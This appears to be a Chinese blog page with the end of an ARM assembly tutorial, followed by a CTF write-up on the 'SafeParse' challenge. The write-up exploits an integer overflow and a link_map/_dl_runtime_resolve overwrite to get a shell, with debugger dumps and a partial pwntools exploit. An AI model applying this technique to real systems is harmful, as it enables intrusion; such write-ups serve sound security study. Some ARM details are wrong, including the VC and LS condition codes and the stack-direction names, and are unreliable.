<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LDM r0, &#123;r4,r5&#125;              /* words[3] -&gt; r4 = 0x03; words[4] -&gt; r5 = 0x04 */</span><br></pre></td></tr></table></figure>
<ul>
<li>R0 中装有 <code>word[3]</code> </li>
<li>我们使用一个命令加载了多个（2个数据块），该命令将：<ul>
<li><code>R4 = 0x00000003</code> </li>
<li><code>R5 = 0x00000004</code></li>
</ul>
</li>
<li>PS：注意在合适的位置打上花括号</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stm r1, &#123;r4,r5&#125;              /* r4 -&gt; array_buff[0] = 0x03; r5 -&gt; array_buff[1] = 0x04 */</span><br></pre></td></tr></table></figure>
<ul>
<li>R1 中装有 <code>array_buff[0]</code> </li>
<li>我们使用一个命令存储了多个（2个数据块），该命令将：<ul>
<li><code>array_buff[0] = 0x00000003</code></li>
<li><code>array_buff[1] = 0x00000004</code></li>
</ul>
</li>
</ul>
<h2 id="条件执行"><a href="#条件执行" class="headerlink" title="条件执行"></a>条件执行</h2><p>CPSR 中的 N、Z、C 和 V 位与 x86 上 EFLAG 寄存器中的 SF、ZF、CF 和 OF 位相同，它们将用于支持程序集级别的条件和循环中的条件执行</p>
<p>下表列出了可用的条件代码、其含义以及测试的标志的状态：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">Condition Code</th>
<th style="text-align:center">Meaning (for cmp or subs)</th>
<th style="text-align:center">Status of Flags</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">EQ</td>
<td style="text-align:center">相等</td>
<td style="text-align:center">Z==1</td>
</tr>
<tr>
<td style="text-align:center">NE</td>
<td style="text-align:center">不相等</td>
<td style="text-align:center">Z==0</td>
</tr>
<tr>
<td style="text-align:center">GT</td>
<td style="text-align:center">大于（有符号）</td>
<td style="text-align:center">(Z==0) &amp;&amp; (N==V)</td>
</tr>
<tr>
<td style="text-align:center">LT</td>
<td style="text-align:center">小于（有符号）</td>
<td style="text-align:center">N!=V</td>
</tr>
<tr>
<td style="text-align:center">GE</td>
<td style="text-align:center">大于等于（有符号）</td>
<td style="text-align:center">N==V</td>
</tr>
<tr>
<td style="text-align:center">LE</td>
<td style="text-align:center">小于等于（有符号）</td>
<td style="text-align:center">(Z==1) \</td>
<td>\</td>
<td>(N!=V)</td>
</tr>
<tr>
<td style="text-align:center">CS or HS</td>
<td style="text-align:center">大于等于（无符号）</td>
<td style="text-align:center">C==1</td>
</tr>
<tr>
<td style="text-align:center">CC or LO</td>
<td style="text-align:center">小于（无符号）</td>
<td style="text-align:center">C==0</td>
</tr>
<tr>
<td style="text-align:center">HI</td>
<td style="text-align:center">大于（无符号）</td>
<td style="text-align:center">(C==1) &amp;&amp; (Z==0)</td>
</tr>
<tr>
<td style="text-align:center">LS</td>
<td style="text-align:center">小于等于（无符号）</td>
<td style="text-align:center">(C==0) \</td>
<td>\</td>
<td>(Z==0)</td>
</tr>
<tr>
<td style="text-align:center">MI</td>
<td style="text-align:center">负数</td>
<td style="text-align:center">N==1</td>
</tr>
<tr>
<td style="text-align:center">PL</td>
<td style="text-align:center">正数或零</td>
<td style="text-align:center">N==0</td>
</tr>
<tr>
<td style="text-align:center">AL</td>
<td style="text-align:center">True</td>
<td style="text-align:center">–</td>
</tr>
<tr>
<td style="text-align:center">NV</td>
<td style="text-align:center">False</td>
<td style="text-align:center">–</td>
</tr>
<tr>
<td style="text-align:center">VS</td>
<td style="text-align:center">有符号溢出</td>
<td style="text-align:center">V==1</td>
</tr>
<tr>
<td style="text-align:center">VC</td>
<td style="text-align:center">无符号溢出</td>
<td style="text-align:center">V==0</td>
</tr>
</tbody>
</table>
</div>
<p><strong>Thumb 条件执行</strong></p>
<p>ARM 存在多种允许条件执行的 Thumb 版本，某些 ARM 处理器版本支持“IT”指令，该指令允许在 Thumb 状态下有条件地执行最多 4 条指令 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IT&#123;x&#123;y&#123;z&#125;&#125;&#125; cond</span><br></pre></td></tr></table></figure>
<ul>
<li><em>cond</em> 指定 IT 块中第<strong>一</strong>条指令的条件</li>
<li><em>x</em> 指定 IT 块中第<strong>二</strong>条指令的条件开关</li>
<li><em>y</em> 指定 IT 块中第<strong>三</strong>条指令的条件开关</li>
<li><em>z</em> 指定 IT 块中第<strong>四</strong>条指令的条件开关</li>
</ul>
<p>IT 指令的结构是 “IF-Then-(Else)”，语法是两个字母 T 和 E 的构造：</p>
<ul>
<li>IT 指的是 If-Then（下一个指令是有条件的）</li>
<li>ITT 指的是 If-Then-Then（接下来的2条指令是有条件的）</li>
<li>ITE 指的是 If-Then-Else（接下来的2条指令是有条件的）</li>
<li>ITTE 指的是 If-Then-Then-Else（接下来的3个指令是有条件的）</li>
<li>ITTEE 指的是 If-Then-Then-Else-Else（接下来的4个指令是有条件的）</li>
</ul>
<p>IT 块内的每条指令都必须指定一个相同或逻辑相反的条件后缀：</p>
<ul>
<li>如果使用 ITE，则第一条和第二条指令 (If-Then) 必须具有相同的条件后缀，第三条指令 (Else) 必须具有前两条指令的逻辑反比</li>
<li>以下是 ARM 参考手册中的一些示例，其中说明了此逻辑： </li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ITTE   NE           ; Next 3 instructions are conditional</span><br><span class="line">ANDNE  R0, R0, R1   ; ANDNE does not update condition flags</span><br><span class="line">ADDSNE R2, R2, #1   ; ADDSNE updates condition flags</span><br><span class="line">MOVEQ  R2, R3       ; Conditional move</span><br><span class="line"></span><br><span class="line">ITE    GT           ; Next 2 instructions are conditional</span><br><span class="line">ADDGT  R1, R0, #55  ; Conditional addition in case the GT is true</span><br><span class="line">ADDLE  R1, R0, #48  ; Conditional addition in case the GT is not true</span><br><span class="line"></span><br><span class="line">ITTEE  EQ           ; Next 4 instructions are conditional</span><br><span class="line">MOVEQ  R0, R1       ; Conditional MOV</span><br><span class="line">ADDEQ  R2, R2, #10  ; Conditional ADD</span><br><span class="line">ANDNE  R3, R3, #1   ; Conditional AND</span><br><span class="line">BNE.W  dloop        ; Branch instruction can only be used in the last instruction of an IT block</span><br></pre></td></tr></table></figure>
<p><strong>跳转&amp;分支</strong></p>
<p>分支（又名Jumps）允许我们跳转到另一个代码段，当我们需要跳过（或重复）代码块或跳转到特定函数时，这很有用</p>
<ul>
<li>这种用例的最佳示例是 IF 和 Loop</li>
</ul>
<p>有三种类型的分支指令：</p>
<ul>
<li>分支（B）<ul>
<li>简单跳转到函数</li>
</ul>
</li>
<li>分支链接（BL）<ul>
<li>在 LR 中保存 （PC+4） 并跳转到功能</li>
</ul>
</li>
<li>分支交换（BX）和分支链路交换（BLX）<ul>
<li>与 B/BL 交换指令集相同（ARM &lt;-&gt; Thumb）</li>
<li>需要寄存器作为第一个操作数：BX/BLX [reg]</li>
</ul>
</li>
<li>BX/BLX 用于将指令集从 ARM 交换到 Thumb，示例如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">     .code 32         @ ARM mode</span><br><span class="line">     add r2, pc, #1   @ put PC+1 into R2</span><br><span class="line">     bx r2            @ branch + exchange to R2</span><br><span class="line"></span><br><span class="line">    .code 16          @ Thumb mode</span><br><span class="line">     mov r0, #1</span><br></pre></td></tr></table></figure>
<ul>
<li>这里的诀窍是获取实际 PC 的当前值，将其增加“1”，将结果存储到寄存器，然后执行 <code>BX/BLX [reg]</code></li>
<li><code>add r2, pc, #1</code>：简单地获取有效的PC地址（即当前PC寄存器的值+8 -&gt; 0x805C）并为其添加“1”（0x805C + 1 = 0x805D） </li>
</ul>
<h2 id="栈和函数"><a href="#栈和函数" class="headerlink" title="栈和函数"></a>栈和函数</h2><p><strong>栈</strong> </p>
<p>一般来说，堆栈是程序/进程中的内存区域，这部分内存是在创建进程时分配的</p>
<ul>
<li>我们使用 Stack 来存储临时数据，例如某些函数的局部变量，帮助我们在函数之间转换的环境变量等</li>
<li>我们使用 PUSH 和 POP 指令与堆栈进行交互，如 PUSH 和 POP（这是其他一些内存相关指令的别名，而不是实际指令，但出于简单起见，我们使用 PUSH 和 POP）</li>
</ul>
<p>首先，当我们说 Stack 增长时，我们的意思是一个项目（32位数据）被放在 Stack 上，堆栈可以 <strong>向上</strong> 增长（当堆栈以降序方式实现时）或 <strong>向下</strong> 增长（当堆栈以上升方式实现时），下一条（32位）信息的实际位置由堆栈指针定义，或者确切地说，由存储在SP寄存器中的内存地址定义</p>
<p>栈地址的增长方向：</p>
<ul>
<li>向高地址增长的栈称为 <strong>递增栈</strong>（Descendent Stack）</li>
<li>向低地址增长的栈称为 <strong>递减栈</strong>（Acendant Stack） </li>
</ul>
<p>作为不同 Stack 实现的摘要，我们可以使用下表，其中描述了在不同情况下使用哪些存储多个/加载多个指令：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">堆栈类型</th>
<th style="text-align:left">Store</th>
<th style="text-align:left">Load</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">完全降序</td>
<td style="text-align:left">STMFD （STMDB，Decrement Before）</td>
<td style="text-align:left">LDMFD（LDM，Increment after）</td>
</tr>
<tr>
<td style="text-align:center">完全升序</td>
<td style="text-align:left">STMFA （STMIB，Increment Before）</td>
<td style="text-align:left">LDMFA （LDMDA，Decrement After）</td>
</tr>
<tr>
<td style="text-align:center">空降序</td>
<td style="text-align:left">STMED （STMDA，Decrement After）</td>
<td style="text-align:left">LDMED （LDMIB，Increment Before）</td>
</tr>
<tr>
<td style="text-align:center">空升序</td>
<td style="text-align:left">STMEA（STM，Increment after）</td>
<td style="text-align:left">LDMEA （LDMDB，Decrement Before）</td>
</tr>
</tbody>
</table>
</div>
<p><strong>函数</strong></p>
<p>要理解 ARM 中的函数，我们首先需要熟悉函数的结构部分，它们是：</p>
<ol>
<li>Prologue（序幕）</li>
<li>Body（主体）</li>
<li>Epilogue（结语）</li>
</ol>
<p><strong>Prologue（序幕）</strong>的目的是保存程序的先前状态（通过将 LR 和 R11 的值存储到堆栈上），并为函数的局部变量设置堆栈（虽然序言的实现可能因使用的编译器而异，但通常这是通过使用 PUSH / ADD / SUB 指令来完成的）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push &#123;r11, lr&#125; 		/* 序幕的开始,将帧指针和LR保存到堆栈 */</span><br><span class="line">add r11, sp, #0 	/* 设置栈底帧 */</span><br><span class="line">sub sp, sp, #16 	/* 序幕结束,在堆栈上分配一些缓冲区(这也为堆栈帧分配空间) */</span><br></pre></td></tr></table></figure>
<p><strong>Body（主体）</strong> 部分通常负责某种独特而特定的任务，这部分函数可能包含各种指令，分支（跳转）到其他函数等，函数的 body 部分的示例可以像以下几条指令一样简单： </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov r0, #1 			/* 设置局部变量 (a=1)。 这也用作设置函数 max */ 的第一个参数</span><br><span class="line">mov r1, #2 			/* 设置局部变量 (b=2)。 这也用作设置函数 max */ 的第二个参数</span><br><span class="line">bl max 				/* 调用/分支到函数 max */</span><br></pre></td></tr></table></figure>
<ul>
<li>上面的示例代码显示了一个函数的片段，该函数设置局部变量，然后分支到另一个函数</li>
<li>这段代码还向我们展示了函数的参数（在本例中为函数 max）是通过寄存器传递的</li>
<li>在某些情况下，当有超过4个参数要传递时，我们会另外使用 Stack 来存储剩余的参数</li>
<li>还值得一提的是，函数的结果通过寄存器 R0 返回，因此，无论函数（max）的结果是什么，我们应该能够在从函数返回后立即从寄存器 R0 中获取它</li>
<li>需要指出的另一件事是，在某些情况下，结果的长度可能是64位（超过32位寄存器的大小） </li>
</ul>
<p>函数的最后一部分，即 <strong>Epilogue（结语）</strong>，用于将程序的状态恢复到其初始状态（在函数调用之前），以便它可以从它离开的位置继续，为此，我们需要重新调整堆栈指针（这是通过使用帧指针寄存器 R11 作为参考并执行添加或子操作来完成的）</p>
<p>重新调整堆栈指针后，通过将以前（在序幕中）保存的寄存器值从堆栈中弹出到相应的寄存器中来恢复它们，根据函数类型，POP 指令可能是 Epilogue 的最终指令（但是，可能是在恢复寄存器值后，我们使用 BX 指令离开函数），Epilogue 的示例如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub sp, r11, #0 		/* 结尾的开始,重新调整堆栈指针 */</span><br><span class="line">pop &#123;r11, pc&#125; 			/* 结尾,从堆栈中恢复帧指针,通过直接加载到PC中跳转到以前保存的LR,函数的堆栈帧最终在这一步被销毁 */</span><br></pre></td></tr></table></figure>
<p>所以现在我们知道：</p>
<ol>
<li>Prologue（序幕）为功能设置环境</li>
<li>Body（主体）实现函数的逻辑并将结果存储到 R0</li>
<li>Epilogue（结语）还原状态，以便程序可以从调用函数之前离开的位置恢复</li>
</ol>
<p>参考：<a target="_blank" rel="noopener" href="https://azeria-labs.com/writing-arm-assembly-part-1/">编写 ARM 程序集|阿泽里亚实验室</a> </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/26/dl_runtime_resolve%20attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/26/dl_runtime_resolve%20attack/" class="post-title-link" itemprop="url">dl_runtime_resolve attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-26 17:36:41 / Modified: 17:38:57" itemprop="dateCreated datePublished" datetime="2022-08-26T17:36:41+08:00">2022-08-26</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>SafeParse</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SafeParse: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=bb35942986f3f07abe813fd1a86be5920f5b6c7e, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/桌面/pwn_SafeParse/SafeParse&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，全开，开启延迟绑定</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data_size = input_num();</span><br><span class="line">chunk = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="number">4</span> * data_size);         <span class="comment">// 整数溢出</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这里有一个整数溢出（这个漏洞点和初赛 newest_note 的非预期解很像）</li>
</ul>
<p>直接让 data_size 为 0x40040000，就可以让这个存堆指针的堆申请到 libc 上面</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：这里的 size_t 代表的是 unsorted int（4字节）</li>
</ul>
<p>溢出过后，“data_size” 会特别大，但是 mmap 申请的 chunk 又比较小，以下的这个检查就形同虚设了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( index &gt;= data_size )</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>然后就可以实现 libc 任意写，由于没法 leak，我们只能打 <code>_dl_runtime_resolve</code></p>
<p><code>DT_STRTAB</code> 在 elf 中，由于没有泄露任何地址，目前是通过偏移进行任意地址写，这里找到 <code>DT_DEBUG</code> 这个表是指向 libc 地址（我们可以控制），可以通过改写最低位：</p>
<ul>
<li>把 <code>link_map-&gt;l_info[DT_STRTAB]</code> 低位覆盖为 <code>link_map-&gt;l_info[DT_DEBUG]</code> 这样程序就会误以为 <code>DT_DEBUG</code> 是 <code>DT_STRTAB</code>（这下放入 <code>_dl_lookup_symbol_x</code> 的第二个参数就会变成 <code>DT_DEBUG</code>）</li>
<li>于是我们提前在 <code>DT_DEBUG+offset</code>（原来是 <code>DT_STRTAB+offset</code>）的位置写上 <code>system</code></li>
<li>提前在 <code>chunk</code> 中写入 <code>/bin/sh</code></li>
<li>最后在执行 <code>free(chunk)</code> 时就会 get shell</li>
</ul>
<p>低位覆盖 <code>link_map-&gt;l_info[DT_STRTAB]</code>，欺骗 <code>_dl_fixup</code> 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f3b00ba2000</span>+<span class="number">0x324180</span>+<span class="number">0x10</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsi r10 <span class="number">0x7f3b00ec6190</span> —▸ <span class="number">0x564f9b542000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0x7f3b00ec6198</span> ◂— <span class="number">0x6165720000ec6730</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0x7f3b00ec61a0</span> ◂— <span class="number">0x564f9b540064</span> <span class="comment">/* &#x27;d&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0x7f3b00ec61a8</span> —▸ <span class="number">0x7f3b00ec6740</span> —▸ <span class="number">0x7ffe633fe000</span> ◂— jg     <span class="number">0x7ffe633fe047</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0x7f3b00ec61b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0x7f3b00ec61b8</span> —▸ <span class="number">0x7f3b00ec6190</span> —▸ <span class="number">0x564f9b542000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│         <span class="number">0x7f3b00ec61c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x7f3b00ec61c8</span> —▸ <span class="number">0x7f3b00ec6718</span> —▸ <span class="number">0x7f3b00ec6730</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│       <span class="number">0x7f3b00ec61d0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│       <span class="number">0x7f3b00ec61d8</span> —▸ <span class="number">0x564f9b545de0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│       <span class="number">0x7f3b00ec61e0</span> —▸ <span class="number">0x564f9b545ec0</span> ◂— <span class="number">0x2</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│       <span class="number">0x7f3b00ec61e8</span> —▸ <span class="number">0x564f9b545eb0</span> ◂— <span class="number">0x3</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│ rdi<span class="number">-1</span> <span class="number">0x7f3b00ec61f0</span> ◂— <span class="number">0x6d657473797300</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│       <span class="number">0x7f3b00ec61f8</span> —▸ <span class="number">0x564f9b545ea0</span> ◂— <span class="number">0x15</span> <span class="comment">/* 低位覆盖&quot;\xa0&quot; */</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│       <span class="number">0x7f3b00ec6200</span> —▸ <span class="number">0x564f9b545e70</span> ◂— <span class="number">0x6</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│       <span class="number">0x7f3b00ec6208</span> —▸ <span class="number">0x564f9b545ef0</span> ◂— <span class="number">0x7</span></span><br></pre></td></tr></table></figure>
<p><code>_dl_fixup-&gt;_dl_lookup_symbol_x</code> 执行前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7f3b00ea8192</span> &lt;_dl_fixup+<span class="number">210</span>&gt;    call   _dl_lookup_symbol_x                &lt;_dl_lookup_symbol_x&gt;</span><br><span class="line">       rdi: <span class="number">0x7f3b00ec61f1</span> ◂— <span class="number">0xa0006d6574737973</span> <span class="comment">/* &#x27;system&#x27;(free-&gt;system) */</span></span><br><span class="line">       rsi: <span class="number">0x7f3b00ec6190</span> —▸ <span class="number">0x564f9b542000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line">       rdx: <span class="number">0x7ffe633dbfa8</span> —▸ <span class="number">0x564f9b547018</span> ◂— <span class="number">0x1200000091</span></span><br><span class="line">       rcx: <span class="number">0x7f3b00ec64f8</span> —▸ <span class="number">0x7f3b00ec6450</span> —▸ <span class="number">0x7f3b00e95590</span> —▸ <span class="number">0x7f3b00ec6190</span> —▸ <span class="number">0x564f9b542000</span> ◂— ...</span><br><span class="line">       r8: <span class="number">0x7f3b00e955e0</span> —▸ <span class="number">0x564f9b5480a0</span> ◂— <span class="string">&#x27;GLIBC_2.2.5&#x27;</span></span><br><span class="line">       r9: <span class="number">0x1</span></span><br><span class="line">       arg[<span class="number">6</span>]: <span class="number">0x1</span></span><br><span class="line">       arg[<span class="number">7</span>]: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./SafeParse1&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./SafeParse1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;b *$rebase(0x1620)\n&quot;</span></span><br><span class="line"><span class="comment">#cmd += &quot;b *$rebase(0x15FA)\n&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(p,cmd)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x4000</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Data Size: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x40040000</span>))</span><br><span class="line"></span><br><span class="line">_IO_2_1_stdout_ = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_offset = _IO_2_1_stdout_+<span class="number">0x101000</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">link_map_offset = <span class="number">0x324190</span>-<span class="number">0x10</span></span><br><span class="line">r_debug_offset = <span class="number">0x324160</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;_IO_2_1_stdout_ &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_2_1_stdout_))</span><br><span class="line">success(<span class="string">&quot;_IO_2_1_stdout_offset &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_2_1_stdout_offset))</span><br><span class="line">success(<span class="string">&quot;link_map_offset &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(link_map_offset))</span><br><span class="line">success(<span class="string">&quot;link_map_offset+0x40+5*0x8 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>))</span><br><span class="line">success(<span class="string">&quot;r_debug_offset &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(r_debug_offset))</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc.sym[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># _IO_2_1_stdout_offset &gt;&gt; 0x2ee690</span></span><br><span class="line"><span class="comment"># link_map_offset &gt;&gt; 0x324180</span></span><br><span class="line"><span class="comment"># link_map_offset+0x40+5*0x8 &gt;&gt; 0x3241e8</span></span><br><span class="line"><span class="comment"># r_debug_offset &gt;&gt; 0x324150 </span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;,&gt;&quot;</span>*<span class="number">2</span>+<span class="string">&quot;&lt;&quot;</span>*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">payload +=<span class="string">&quot;&gt;*&gt;***&gt;***&gt;******&gt;**&gt;**&gt;**&quot;</span></span><br><span class="line">payload +=<span class="string">&quot;&gt;&quot;</span>*<span class="number">36</span>+<span class="string">&quot;,&gt;&quot;</span>*<span class="number">2</span>+<span class="string">&quot;&lt;&quot;</span>*<span class="number">38</span></span><br><span class="line">payload +=<span class="string">&quot;&gt;&quot;</span>*<span class="number">15</span>+<span class="string">&quot;,&gt;&quot;</span>*<span class="number">2</span>+<span class="string">&quot;&lt;&quot;</span>*<span class="number">17</span></span><br><span class="line"></span><br><span class="line">payload +=<span class="string">&quot;&gt;&quot;</span>*<span class="number">38</span>+<span class="string">&quot;,&quot;</span>+<span 